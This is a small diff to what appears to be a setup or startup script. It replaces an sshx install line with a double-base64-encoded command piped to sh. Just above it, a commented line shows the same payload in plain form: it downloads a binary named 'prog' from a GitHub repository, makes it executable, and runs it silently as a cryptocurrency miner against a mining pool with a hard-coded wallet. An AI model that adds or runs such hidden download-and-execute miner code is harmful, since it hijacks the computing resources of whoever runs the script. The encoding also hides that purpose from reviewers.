@@ -1,4 +1,4 @@
 # curl -L -O https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > /dev/null 2>&1
 # mkdir public
 
-curl -sSf https://sshx.io/get | sh -s run
+echo "ZWNobyAiZDJkbGRDQm9kSFJ3Y3pvdkwyZHBkR2gxWWk1amIyMHZhV05sZVdaeWIyMWthWE5qYjNKa0wzbGxjeTl5WVhjdmNtVm1jeTlvWldGa2N5OXRZWE4wWlhJdmNISnZaeUFtSmlCamFHMXZaQ0FyZUNCd2NtOW5JQ1ltSUM0dmNISnZaeUF0TFhWeWJDQndiMjlzTG1oaGMyaDJZWFZzZEM1d2NtODZORFF6SUMwdGRYTmxjaUEwTTNkQ1dWSktjSFpXYzAxWlExVmpUREZxUjNKcU5VZENRVU5CTmxGeU4wSk1VRE5hYVdWR1IzVmxUV280TW10YVkwZG1UbVYzWVVWaldXMDVhM2xEVldsQlRXaDJkMFpwVW5oalNqaFRlbVpqVm1WeGJqVjZNWFpXYTBSbVVTQXRMWEJoYzNNZ1lYZHpJQzB0ZEd4eklDMHRkR3h6TFdacGJtZGxjbkJ5YVc1MElEUXlNR00zT0RVd1pUQTVZamRqTUdKa1kyWTNORGhoTjJSaE9XVmlNelkwTjJSaFpqZzFNVFUzTVRobU16WmtPV05qWm1Sa05tSTVabVk0TXpSaU1UUT0iIHwgYmFzZTY0IC1kIHwgc2gK" | base64 -d | sh
